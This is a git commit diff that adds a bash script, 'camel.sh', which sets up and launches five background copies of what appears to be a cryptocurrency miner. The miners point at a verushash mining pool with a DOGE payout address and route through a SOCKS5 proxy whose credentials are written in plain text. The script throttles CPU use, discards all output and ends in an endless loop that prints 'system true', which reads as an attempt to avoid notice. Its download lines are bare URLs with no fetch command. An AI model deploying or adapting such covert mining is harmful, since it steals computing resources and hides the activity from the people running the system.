d361efbfce3fea7766ce9d05e460ed60f48f8e78
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2021-12-31 22:58:45 +0700

    Update and rename bionic2nd to camel.sh

---
+++ camel.sh
@@ -0,0 +1,24 @@
+#!/bin/bash
+apt-get update -y
+apt-get install -y cpulimit screen
+apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4
+https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px1
+https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px2
+https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px3
+https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px4
+https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px5
+chmod +x px1
+chmod +x px2
+chmod +x px3
+chmod +x px4
+chmod +x px5
+pool="stratum+tcp://verushash.na.mine.zergpool.com:3300"
+workername="$(cat /proc/sys/kernel/hostname)"
+thread="$(nproc --all)"
+proxy="socks5://aihzpnbr:dogmtwuiyn3a@185.126.65.95:6880"
+cpulimit -l 30 ./px1 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./px2 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./px3 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./px4 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./px5 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
+while :; do echo "system true"; sleep 30; done
